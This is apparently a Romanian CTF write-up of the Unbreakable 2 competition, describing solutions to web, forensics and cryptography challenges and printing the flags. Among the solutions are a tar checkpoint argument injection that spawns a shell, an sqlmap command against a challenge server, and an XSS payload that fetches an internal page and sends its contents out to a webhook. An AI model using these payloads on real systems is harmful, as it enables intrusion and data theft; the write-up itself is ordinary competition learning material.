---
title : Unbreakable 2
published : true
date: 2020-12-18T12:59:05+02:00
author : PS
---


## Contents

- Tartarsausage(web)    

- Sherlock's Mystery(Forensics)    

- small-data-leak(web)    

- HiddenTypo(Forensics)    

- frameble(web) 

- war-plan(cryptography, steganography)  

- conclusion

### Tartarsausage  
Tartarsausage la prima vedere parea o mare durere de cap    
In momentul accesarii paginii , suntem intampinati de un file upload    


![test](tts1.png)
Am incercat tot ce se puteam incerca , de la payloads in php pana la xss (unde am gasit un xss in name-ul imaginilor )  
So, am inceput sa rulez un dirb , poate gaseste ceva,  
Singurul lucru gasit a fost un index.php care nu m-a ajutat cu nimic  
Dar dupa ce m-am uitat in codul sursa al paginii am gasit :   

{{< highlight go  >}}
form action="sadjwjaskdkwkasjdkwasdasdas.html" method="POST"
{{< / highlight >}}
Nu vreti sa stiti cat am ras cand am vazut pagina ascunsa ROFL

Accesand pagina gasim 


![test](tts2.png)
Avem deja un mare *hint* **Enter TAR**  
so, dat find faptul ca nu sunt foarte bun cu tar (nu sunt bun deloc) a trebuit sa fac niste googling si am dat de GTFOBins
si aveau un payload pt asta :  
{{< highlight go  >}}
-cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
{{< / highlight >}}
Dupa asta cam tot a fost usor , inlocuiesti */bin/sh* cu ls -la , iar dupa ce descoperi fisierul cu flag-ul , mai trebuie un simplu cat  
{{< highlight go >}} Flag Proof : ctf{d618f4caf3fdca9634a6ab498883a992f2a125b891165b30a5925f2845708ab7}{{< / highlight >}}  


### Sherlock's Mystery
Acest chall a fost destul de ciudat , iar prin ciudat ma refer la faptul ca se rezolva prin simpla citire a fisierului dat  
Dupa ce decodam un string gasit la linia 216 avem flag-ul  
{{< highlight go >}}  Flag Proof :  ctf{thisisthe1stflag} {{< / highlight >}}  


### small-data-leak
small-data-leak sau SDL cum imi place sa ii spun a fost o simpla sqli vulnerabilitate , in descrierea chall-ului gasim /user?id=
ceea ce ne indica aceasta vulnerabilitate , fara sa mai vizitez pagina m-am dus direct la sqlmap  
{{< highlight go >}}   sqlmap -u 'http://35.198.183.125:30321/user?id=1' --tables {{< / highlight >}}
si gata , avem flag-ul :D !
{{< highlight go >}}   Flag Proof : ctf{70ff919c37a20d6526b02e88c950271a45fa698b037e3fb898ca68295da2fc0a}  {{< / highlight >}}  




### HiddenTypo
Parere personala , din toate chall-urile de la unbr 2 acesta a fost cel mai enervant =))  
Din cauza ca nu am citit atent partea de descriere a chall-ului am pierdut mult timp.  
Am folosit volatility.  
Voi taia direct la solutie, in descriere gasim greseala : **tikcket**  
Comanda finala fiind : 
{{< highlight go >}}   volatility_2.6_lin64_standalone -f admin.bin --profile=Win7SP1x64  dumpfiles -Q 0x000000007e045970 --name tikcket.png -D funny   {{< / highlight >}}  
Am mai pierdut timp deoarece am uitat ca e o imagine , iar in loc sa o deschid ca un om normal i-am dat *cat* :D  
Iar finalul grandios a fost : 


![test](lmao.png)
**Puteam sa ghicesc aia** 

### frameble 
frameble este fratele mai mic al lui cross-me de la DCTF-2020 =))  
In mare parte a fost easy , deoarece  a mai fost dat , voi pune direct payload-ul  


{{< highlight go >}}     "><script>fetch('http://127.0.0.1:1234/index.php?page=post&id=33').then(function(response){return response.text();}).then(function(myText){location='webhook'+btoa(myText) });</script> {{< / highlight >}}

in contentul criptat in base64 din response gasim in **body** flag-ul

{{< highlight go >}}    Flag Proof : CTF{ce6675f186ac75938de69ba5037fa42f792e0041404456d11b1a80d072f4b547} {{< / highlight >}}


### war-plan  
In war-plan primim un .wav file, dupa ce am ascultat 4 secunde fisierul am realizat ca e morse code  
Asa ca am cautat pe *gugle* ceva tool si am gasit , apoi au venit 30 de min dureroase de ascultat numai beep-boop-beep  
Am luat codul final  
{{< highlight go >}}   THE BATTLE OF THE BULGE, ALSO KNOWN AS THE ARDENNES COUNTEROFFENSIVE, WAS THE LAST MAJOR GERMAN OFFENSIVE CAMPAIGN ON THE WESTERN FRONT DURING WORLD WAR II, AND TOOK PLACE FROM 16 DECEMBER 1944 TO 25 JANUARY 1945. IT WAS LAUNCHED THROUGH THE DENSELY FORESTED ARDENNES REGION OF WALLONIA IN EASTERN BELGIUM, NORTHEAST FRANCE, AND LUXEMBOURG, TOWARDS THE END OF THE WAR IN EUROPE. THE OFFENSIVE WAS INTENDED TO STOP ALLIED USE OF THE BELGIAN PORT OF ANTWERP AND TO SPLIT THE ALLIED LINES, ALLOWING THE GERMANS TO ENCIRCLE AND DESTROY FOUR ALLIED ARMIES AND FORCE THE WESTERN ALLIES TO NEGOTIATE A PEACE TREATY IN THE AXIS POWERS' FAVOR. XXGVXVVVXDVAAFGXFGGXXAGXFVGGAAFAAVVADDVGDGGGVAAAGGXDFXXVDXXVVAVGGAGGXVVAVVGAVGFVVDVV BEFORE THE OFFENSIVE THE ALLIES WERE VIRTUALLY BLIND TO GERMAN TROOP MOVEMENT. DURING THE LIBERATION OF FRANCE, THE EXTENSIVE NETWORK OF THE FRENCH RESISTANCE HAD PROVIDED VALUABLE INTELLIGENCE ABOUT GERMAN DISPOSITIONS. ONCE THEY REACHED THE GERMAN BORDER, THIS SOURCE DRIED UP. IN FRANCE, ORDERS HAD BEEN RELAYED WITHIN THE GERMAN ARMY USING RADIO MESSAGES ENCIPHERED BY THE ENIGMA MACHINE, AND THESE COULD BE PICKED UP AND DECRYPTED BY ALLIED CODE-BREAKERS HEADQUARTERED AT BLETCHLEY PARK, TO GIVE THE INTELLIGENCE KNOWN AS ULTRA. IN GERMANY SUCH ORDERS WERE TYPICALLY TRANSMITTED USING TELEPHONE AND TELEPRINTER, AND A SPECIAL RADIO SILENCE ORDER WAS IMPOSED ON ALL MATTERS CONCERNING THE UPCOMING OFFENSIVE. 42 THE MAJOR CRACKDOWN IN THE WEHRMACHT AFTER THE 20 JULY PLOT TO ASSASSINATE HITLER RESULTED IN MUCH TIGHTER SECURITY LRX09BF1W3QUKJP52M4ZDCHOSYIE6VG8NAT7 AND FEWER LEAKS. THE ATTACKS BY THE SIXTH PANZER ARMY'S INFANTRY UNITS IN THE NORTH FARED BADLY BECAUSE OF UNEXPECTEDLY FIERCE RESISTANCE BY THE U.S. 2ND AND 99TH INFANTRY DIVISIONS. KAMPFGRUPPE PEIPER, AT THE HEAD OF SEPP DIETRICH'S SIXTH PANZER ARMY, HAD BEEN DESIGNATED TO TAKE THE LOSHEIM-LOSHEIMERGRABEN ROAD, A KEY2: SECONDWORLDWAR ROUTE THROUGH THE LOSHEIM GAP, BUT IT WAS CLOSED BY TWO COLLAPSED OVERPASSES THAT GERMAN ENGINEERS FAILED TO REPAIR DURING THE FIRST DAY. {{< / highlight >}}
 ce era 80% plain text , dar avea 3 strings foarte interesante : 
key2 : secondworlwar
XXGVXVVVXDVAAFGXFGGXXAGXFVGGAAFAAVVADDVGDGGGVAAAGGXDFXXVDXXVVAVGGAGGXVVAVVGAVGFVVDVV
LRX09BF1W3QUKJP52M4ZDCHOSYIE6VG8NAT7  
Ok, luand in considerare ca vorbim se second world war si de germania well realizam ca este vorba despre ADFGVX cipher **sad natzi noises** (joking =)) )  
**KABOOM**
Decriptam codul si poc avem flag-ul 

{{< highlight go >}}   Flag Proof : defendthewestgateofthefortresswithallcosts -> ctf{70cca323b9e0af74985285521f5751106a34f5c0b534e3f14c24c8fca027d9fc} {{< / highlight >}}




### Conclusion 

I got 9th place with 6/12 challs resolved <3 
![test](top.png)










